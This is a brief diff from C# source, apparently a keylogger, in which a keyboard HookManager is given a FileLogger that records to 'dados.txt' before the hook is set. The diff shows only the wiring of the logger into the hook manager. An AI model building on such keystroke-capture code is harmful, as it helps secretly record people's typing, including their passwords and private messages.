@@ -36,7 +36,7 @@ namespace Agente1
             string filePath = Path.Combine(AppDomain.CurrentDomain.BaseDirectory, "dados.txt");
             fileLogger = new FileLogger(filePath);
             keyHandler = new KeyHandler(fileLogger);
-            hookManager = new HookManager(keyHandler);
+            hookManager = new HookManager(keyHandler,fileLogger);
 
             hookManager.SetHook();
             fileLogger.LogSessionStart();
